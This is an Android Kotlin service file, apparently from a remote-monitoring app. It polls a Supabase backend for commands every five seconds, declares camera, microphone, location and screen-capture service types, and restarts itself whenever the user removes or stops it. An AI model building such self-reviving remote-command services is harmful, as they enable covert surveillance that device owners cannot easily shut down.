package com.guard.screen.services

import android.app.Notification
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.guard.screen.R
import com.guard.screen.core.Constants
import com.guard.screen.core.DeviceKey
import com.guard.screen.core.Logger
import com.guard.screen.domain.usecase.SyncCommandsUseCase
import com.guard.screen.notifications.NotificationHelper
import com.guard.screen.receivers.AlarmReceiver
import com.guard.screen.workers.HeartbeatWorker
import com.guard.screen.workers.KeepAliveWorker
import com.guard.screen.workers.RetryUploadWorker
import com.guard.screen.workers.TokenRefreshWorker
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import javax.inject.Inject

/**
 * Main foreground service.
 * Ye har 5 sec pe Supabase se commands fetch karta hai aur process karta hai.
 */
@AndroidEntryPoint
class GuardService : Service() {

    @Inject
    lateinit var syncCommandsUseCase: SyncCommandsUseCase

    @Inject
    lateinit var notificationHelper: NotificationHelper

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var pollingJob: Job? = null
    private val deviceKey by lazy { DeviceKey.get(this) }

    override fun onCreate() {
        super.onCreate()
        Logger.i("GuardService", "Service created — device: $deviceKey")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Logger.d("GuardService", "onStartCommand")

        // Start foreground with notification
        startForegroundSafely()

        // Start command polling
        startCommandPolling()

        // Schedule workers (backup mechanisms)
        scheduleWorkers()

        // Schedule alarm (another backup)
        AlarmReceiver.scheduleNext(this)

        // Update last seen
        updateLastSeen()

        return START_STICKY
    }

    // ============================================
    // FOREGROUND NOTIFICATION
    // ============================================

    private fun startForegroundSafely() {
        val notification = notificationHelper.buildServiceNotification()

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(
                    Constants.NOTIF_ID_SERVICE,
                    notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
                            ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION or
                            ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
                            ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
                            ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
                )
            } else {
                startForeground(Constants.NOTIF_ID_SERVICE, notification)
            }
        } catch (e: Exception) {
            Logger.e("GuardService", "startForeground failed", e)
            // Fallback — without type
            try {
                startForeground(Constants.NOTIF_ID_SERVICE, notification)
            } catch (_: Exception) {}
        }
    }

    // ============================================
    // COMMAND POLLING
    // ============================================

    private fun startCommandPolling() {
        pollingJob?.cancel()
        pollingJob = serviceScope.launch {
            Logger.d("GuardService", "Command polling started")

            while (isActive) {
                try {
                    val result = syncCommandsUseCase(deviceKey)
                    when (result) {
                        is com.guard.screen.core.AppResult.Success -> {
                            if (result.data > 0) {
                                Logger.i("GuardService", "Processed ${result.data} commands")
                            }
                        }
                        is com.guard.screen.core.AppResult.Error -> {
                            Logger.w("GuardService", "Sync error: ${result.message}")
                        }
                        else -> {}
                    }
                } catch (e: Exception) {
                    Logger.e("GuardService", "Polling iteration failed", e)
                }

                delay(Constants.COMMAND_POLL_INTERVAL_MS)
            }
        }
    }

    // ============================================
    // WORKERS SCHEDULING
    // ============================================

    private fun scheduleWorkers() {
        try {
            HeartbeatWorker.schedule(this)
            KeepAliveWorker.schedule(this)
            RetryUploadWorker.schedule(this)
            TokenRefreshWorker.schedule(this)
            Logger.d("GuardService", "All workers scheduled")
        } catch (e: Exception) {
            Logger.e("GuardService", "Worker scheduling failed", e)
        }
    }

    // ============================================
    // LAST SEEN
    // ============================================

    private fun updateLastSeen() {
        serviceScope.launch {
            try {
                // Heartbeat worker bhi karta hai, ye immediate update ke liye
                val prefs = getSharedPreferences(Constants.PREFS_NAME, Context.MODE_PRIVATE)
                prefs.edit().putLong(Constants.KEY_LAST_SEEN, System.currentTimeMillis()).apply()
            } catch (_: Exception) {}
        }
    }

    // ============================================
    // LIFECYCLE
    // ============================================

    override fun onTaskRemoved(rootIntent: Intent?) {
        Logger.w("GuardService", "Task removed — restarting")

        // Task swipe hone pe restart
        try {
            val restart = Intent(applicationContext, GuardService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                applicationContext.startForegroundService(restart)
            } else {
                applicationContext.startService(restart)
            }
        } catch (e: Exception) {
            Logger.e("GuardService", "Restart failed", e)
        }

        super.onTaskRemoved(rootIntent)
    }

    override fun onDestroy() {
        Logger.w("GuardService", "Service destroyed — restarting")

        try {
            pollingJob?.cancel()
            serviceScope.cancel()
        } catch (_: Exception) {}

        // Restart karo
        try {
            val intent = Intent(this, GuardService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
        } catch (_: Exception) {}

        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
